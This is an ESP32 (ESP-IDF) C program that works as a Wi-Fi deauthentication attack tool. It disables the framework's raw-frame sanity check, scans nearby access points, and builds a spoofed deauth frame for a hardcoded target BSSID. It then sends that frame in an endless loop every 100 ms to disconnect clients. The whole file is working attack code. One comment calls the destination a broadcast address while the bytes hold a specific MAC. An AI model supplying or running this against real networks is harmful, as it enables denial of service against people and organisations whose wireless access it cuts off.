#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_log.h"

static const char *TAG = "WIFI_DEAUTHER";
#define MAC2STR(mac) (mac)[0], (mac)[1], (mac)[2], (mac)[3], (mac)[4], (mac)[5]
#define MACSTR "%02x:%02x:%02x:%02x:%02x:%02x"

// prevent sanity check from base esp-idf framework by overriding it (C compiler not happy)
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

// esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Target AP's BSSID (replace with your AP's MAC address)
uint8_t target_bssid[6] = {0x66, 0xa1, 0xf9, 0xa1, 0x5e, 0x1b};

uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control
    0x00, 0x00,                         // Duration
    0x52, 0xF2, 0x71, 0xea, 0x41, 0xed, // Destination Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason Code
};

void print_frame(const uint8_t *frame, size_t length)
{
    for (size_t i = 0; i < length; i++)
    {
        printf("%02X ", frame[i]);
        if ((i + 1) % 16 == 0) // Print 16 bytes per line
        {
            printf("\n");
        }
    }
    printf("\n");
}

void scan_networks(void)
{
    wifi_scan_config_t scan_config = {0};
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);

    // Limit ap_count to a reasonable maximum
    if (ap_count > 20)
        ap_count = 20;

    // Allocate memory on the heap
    wifi_ap_record_t *ap_records = malloc(ap_count * sizeof(wifi_ap_record_t));
    if (ap_records == NULL)
    {
        ESP_LOGE(TAG, "Failed to allocate memory for AP records");
        return;
    }

    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_records));

    ESP_LOGI(TAG, "----------------------- STARTING SCAN ----------------------");
    for (int i = 0; i < ap_count; i++)
    {
        ESP_LOGI(TAG, "AP: %s, BSSID: " MACSTR, ap_records[i].ssid, MAC2STR(ap_records[i].bssid));
    }

    // Free the allocated memory
    free(ap_records);
}

void deauth_task(void *pvParameters)
{

    memcpy(&deauth_frame[10], target_bssid, 6); // Source Address
    memcpy(&deauth_frame[16], target_bssid, 6); // BSSID

    ESP_LOGI(TAG, "DEAUTH FRAME");
    print_frame(deauth_frame, sizeof(deauth_frame));

    ESP_LOGI(TAG, "Starting deauth attack...");

    while (true)
    {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (ret == ESP_OK)
        {
            ESP_LOGI(TAG, "Sent deauth packet");
        }
        else
        {
            ESP_LOGE(TAG, "Failed to send packet: %s", esp_err_to_name(ret));
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    vTaskDelete(NULL);
}

void wifi_init(void)
{
    // Initialize NVS (non-volatile storage)
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    // Initialize the event loop
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    // Initialize WiFi
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    // Set promiscuous mode (not strictly needed for sending, but useful for debugging)
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_LOGI(TAG, "WiFi initialized");
}

void app_main()
{
    wifi_init();

    vTaskDelay(pdMS_TO_TICKS(2000));
    scan_networks();
    vTaskDelay(pdMS_TO_TICKS(2000));

    xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, NULL);
}